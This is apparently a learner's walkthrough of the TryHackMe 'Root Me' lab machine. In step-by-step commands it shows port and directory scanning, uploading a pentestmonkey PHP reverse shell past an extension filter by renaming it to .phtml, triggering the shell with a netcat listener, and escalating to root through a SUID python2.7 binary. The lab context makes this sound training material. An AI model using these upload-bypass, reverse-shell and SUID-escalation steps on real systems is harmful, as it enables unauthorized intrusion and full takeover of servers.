# TRYHACKME - ROOT ME

1. scanning machine with ```nmap -sC -sV -oN scan.txt 10.114.180.141```.
Open ports are 22 (ssh) and 80 (standard HTTP protocol port, Apache 2.4.41 on Ubuntu os, uses PHP)

2. used GoBuster ```gobuster dir -u http://10.114.180.141 -w /usr/share/dirb/wordlists/common.txt``` after common.txt installation to find relevant.

*Note: `-f` appends `/` to directory paths. Useful detail I learned while using GoBuster. Apache's `AcceptPathInfo` also explains why `/index.php/` can return the same response as `/index.php`.*

3. ```curl -s http://10.114.180.141/panel/``` to go to the hidden /panel/ folder. served a default index file.
- action="" submits the form data back to the exact same URL (/panel/).
- method="POST" sends data inside the hidden HTTP request body
- enctype="multipart/form-data" is specifically required to transmit binary/text files to the server.

*Note: ```ps aux | grep openvpn```, ```sudo pkill openvpn``` because I had too many openvpn instances running*

4. opened listener with netcat ```nc -lvnp 4444```.

downloaded pentestmonkey reverse shell ```git clone https://github.com/pentestmonkey/php-reverse-shell.git```.

edited ip and port in the file and uploaded reverse shell in the form with curl ```curl -F "fileUpload=@../tools/php-reverse-shell.php" -F "submit=Upload" http://10.114.180.141/panel/```.

Need to change file type: ```<p class='erro'>PHP não é permitido!</p>```.

```curl -F "fileUpload=@../tools/php-reverse-shell.phtml" -F "submit=Upload" http://10.114.180.141/panel/```.

5. Activate script: ```curl http://10.114.180.141/uploads/php-reverse-shell.phtml```.

found flag in var/www/user.txt.

6. find suid files with ```find / -perm -4000 -type f 2>/dev/null```

```/usr/bin/python2.7``` looks weird.

Navigate in gtfobins.github.io (shows exploits for many misconfigured systems), found this command to use SUID:
```/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'```

check id permissions, effective UID root confirmed:
```id```
```uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)```

find and read flag:
```find -name "root.txt" 2>/dev/null```
```cat /root/root.txt```